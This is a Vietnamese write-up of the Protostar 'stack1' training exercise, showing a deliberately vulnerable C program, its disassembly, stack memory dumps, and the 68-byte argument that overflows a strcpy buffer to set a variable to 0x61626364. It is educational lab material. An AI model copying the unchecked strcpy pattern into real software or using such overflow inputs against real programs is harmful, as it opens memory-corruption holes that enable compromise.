---
layout: post
title: stack1
---
Trong bài trước, chúng ta đã tìm hiểu về cách 1 biến tạm được lưu trên stack và lỗ hổng cho phép giá của nó có thể thay đổi gián tiếp qua hàm `gets`. Ngoài hàm `gets`, trong bài này, ta sẽ xem xét một hàm khác là `strcpy`, cũng có khả năng gây ra lỗ hổng tương tự.
Sau đây là source code của chương trình stack1:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Khi disassemble hàm `main`, ta được đoạn chương trình sau:
```asm
0x08048464 <main+0>:    push   ebp
0x08048465 <main+1>:    mov    ebp,esp
0x08048467 <main+3>:    and    esp,0xfffffff0
0x0804846a <main+6>:    sub    esp,0x60
0x0804846d <main+9>:    cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <main+13>:   jne    0x8048487 <main+35>
0x08048473 <main+15>:   mov    DWORD PTR [esp+0x4],0x80485a0
0x0804847b <main+23>:   mov    DWORD PTR [esp],0x1
0x08048482 <main+30>:   call   0x8048388 <errx@plt>
0x08048487 <main+35>:   mov    DWORD PTR [esp+0x5c],0x0
0x0804848f <main+43>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:   add    eax,0x4
0x08048495 <main+49>:   mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:   mov    DWORD PTR [esp+0x4],eax
0x0804849b <main+55>:   lea    eax,[esp+0x1c]
0x0804849f <main+59>:   mov    DWORD PTR [esp],eax
0x080484a2 <main+62>:   call   0x8048368 <strcpy@plt>
0x080484a7 <main+67>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:   cmp    eax,0x61626364
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>
0x080484b2 <main+78>:   mov    DWORD PTR [esp],0x80485bc
0x080484b9 <main+85>:   call   0x8048398 <puts@plt>
0x080484be <main+90>:   jmp    0x80484d5 <main+113>
0x080484c0 <main+92>:   mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 <main+96>:   mov    eax,0x80485f3
0x080484c9 <main+101>:  mov    DWORD PTR [esp+0x4],edx
0x080484cd <main+105>:  mov    DWORD PTR [esp],eax
0x080484d0 <main+108>:  call   0x8048378 <printf@plt>
0x080484d5 <main+113>:  leave
0x080484d6 <main+114>:  ret
```

Cũng giống như bài trước, ta rút ra được những lưu ý sau:
1. Biến `modified` sẽ được lưu trên stack với địa chỉ `esp + 0x5c`. Biến này có 4 byte.
2. Biến `buffer` cũng được lưu trên stack từ địa chỉ `esp + 0x1c` cho đến `esp + 0x5b`. Biến này có 64 byte.

2 biến `buffer` và `modified` nằm kề nhau và chiếm bộ nhớ từ `esp + 0x1c` cho đến hết `esp + 0x5f`.
Ở đây, giá trị của `buffer` sẽ được quyết định bởi tham số đầu tiên `argv[1]` khi chương trình được chạy.
Chỉ cần tham số này vượt quá 64 byte, giá trị của `modified` cũng sẽ bị thay đổi.

Để dễ tưởng tượng, sau đây là 96 byte bộ nhớ bắt đầu từ địa chỉ `esp`, trước khi người dùng nhập giá trị cho `buffer`.
Phân biệt theo màu: <span style="color:aqua">buffer</span> và <span style="color:orangered">modified</span>.
<pre class="memory">
0xbffff6f0:     0xbffff70c      0xbffff93e      0xb7fff8f8      0xb7f0186e
0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      <span style="color:aqua">0xb7eada75</span>
0xbffff710:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x080496fc</span>      <span style="color:aqua">0xbffff728</span>      <span style="color:aqua">0x08048334</span>
0xbffff720:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x080496fc</span>      <span style="color:aqua">0xbffff758</span>      <span style="color:aqua">0x08048509</span>
0xbffff730:     <span style="color:aqua">0xb7fd8304</span>      <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x080484f0</span>      <span style="color:aqua">0xbffff758</span>
0xbffff740:     <span style="color:aqua">0xb7ec6365</span>      <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x080484fb</span>      <span style="color:orangered">0x00000000</span>
</pre>

Nếu sử dụng input như bài trước, ta sẽ sửa được giá trị của `modified` thành `0x00000078`.
Sau đây là bộ nhớ sau `strcpy`.

```bash
stack1 "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888x"
```

<pre class="memory">
0xbffff6f0:     0xbffff70c      0xbffff941      0xb7fff8f8      0xb7f0186e
0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      <span style="color:aqua">0x41414141</span>
0xbffff710:     <span style="color:aqua">0x42424242</span>      <span style="color:aqua">0x43434343</span>      <span style="color:aqua">0x44444444</span>      <span style="color:aqua">0x45454545</span>
0xbffff720:     <span style="color:aqua">0x46464646</span>      <span style="color:aqua">0x47474747</span>      <span style="color:aqua">0x48484848</span>      <span style="color:aqua">0x31313131</span>
0xbffff730:     <span style="color:aqua">0x32323232</span>      <span style="color:aqua">0x33333333</span>      <span style="color:aqua">0x34343434</span>      <span style="color:aqua">0x35353535</span>
0xbffff740:     <span style="color:aqua">0x36363636</span>      <span style="color:aqua">0x37373737</span>      <span style="color:aqua">0x38383838</span>      <span style="color:orangered">0x00000078</span>
</pre>

Tuy nhiên để đạt được đúng mục tiêu exploit chương trình stack1, chúng ta sẽ cần gán giá trị cho `modified` là `0x61626364`.
4 byte giá trị này tương đương với `"dcba"` (chuỗi ngược do kiến trúc CPU dùng Little Endian).
Sau đây là lệnh và tham số để chạy stack1 cho ra đúng kết quả mong muốn.

```bash
stack1 "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888dcba"
```

Đi kèm với đó là bộ nhớ sau `strcpy` để bạn dễ tưởng tượng.

<pre class="memory">
0xbffff6f0:     0xbffff70c      0xbffff93e      0xb7fff8f8      0xb7f0186e
0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      <span style="color:aqua">0x41414141</span>
0xbffff710:     <span style="color:aqua">0x42424242</span>      <span style="color:aqua">0x43434343</span>      <span style="color:aqua">0x44444444</span>      <span style="color:aqua">0x45454545</span>
0xbffff720:     <span style="color:aqua">0x46464646</span>      <span style="color:aqua">0x47474747</span>      <span style="color:aqua">0x48484848</span>      <span style="color:aqua">0x31313131</span>
0xbffff730:     <span style="color:aqua">0x32323232</span>      <span style="color:aqua">0x33333333</span>      <span style="color:aqua">0x34343434</span>      <span style="color:aqua">0x35353535</span>
0xbffff740:     <span style="color:aqua">0x36363636</span>      <span style="color:aqua">0x37373737</span>      <span style="color:aqua">0x38383838</span>      <span style="color:orangered">0x61626364</span>
</pre>

## Ref
```bash
user@protostar:~$ stack1 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888dcba
you have correctly got the variable to the right value
```
